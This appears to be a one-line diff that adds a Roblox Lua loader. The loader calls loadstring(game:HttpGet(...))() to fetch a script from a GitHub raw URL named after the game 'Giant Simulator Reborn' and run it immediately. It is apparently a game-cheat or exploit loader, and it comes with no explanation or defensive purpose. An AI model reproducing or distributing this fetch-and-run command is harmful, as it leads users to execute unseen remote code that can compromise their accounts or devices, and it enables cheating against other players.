@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/giant-simulator-reborn-spam6-d41qoy0fmkcjrp.lua"))()
